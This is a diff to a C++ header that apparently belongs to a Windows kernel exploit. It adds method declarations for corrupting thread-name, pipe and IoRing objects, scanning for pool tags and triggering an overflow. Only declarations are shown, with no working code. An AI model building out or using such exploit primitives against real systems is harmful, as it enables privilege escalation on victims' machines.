@@ -50,10 +50,13 @@ public:
 
 
 	bool GetEPROCESS(UINT64 iClientManager);
+
+	bool GetThreadNameLayout();
 	bool GetPipeLayout();
 	bool GetIORingLayout();
 
-	bool CorruptePipe();
+	bool CorruptThreadName();
+	bool CorruptPipe();
 	bool CorruptIoRing();
 
 	bool Cleanup();
@@ -62,6 +65,8 @@ public:
 	UINT64 HandleToPointer(HANDLE iHandle);
 	bool EnumVersion();
 	UINT64 GetOffset(std::string structName, std::string memberName);
+	std::vector<UINT64> ScanForPoolTag(const BYTE* data, size_t size, const char* tag);
+
     // Helper to call the global Hvergelmir PrimeOverflow callback via singleton
 	void InvokePrimeOverflow(UINT64 count);
     void InvokeTriggerOverflow(BYTE* buf, UINT64 size);
